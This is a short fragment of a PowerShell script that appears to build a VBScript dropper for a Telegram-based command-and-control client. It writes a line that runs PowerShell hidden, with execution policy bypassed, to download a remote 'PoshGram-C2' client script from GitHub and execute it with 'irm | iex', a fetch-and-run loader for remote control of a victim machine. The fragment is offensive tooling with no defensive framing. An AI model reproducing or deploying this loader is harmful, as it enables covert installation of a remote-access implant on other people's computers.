...
$ParentInput.Text = "https://raw.githubusercontent.com/beigeworm/PoshGram-C2/main/Telegram-C2-Client.ps1"
...
"WshShell.Run ```"powershell.exe -NonI -NoP -Ep Bypass -W H -C ```$tg='`$tg'; irm https://raw.githubusercontent.com/beigeworm/PoshGram-C2/main/Telegram-C2-Client.ps1 | iex```", 0, True" | Out-File -FilePath $tempc2client -Append
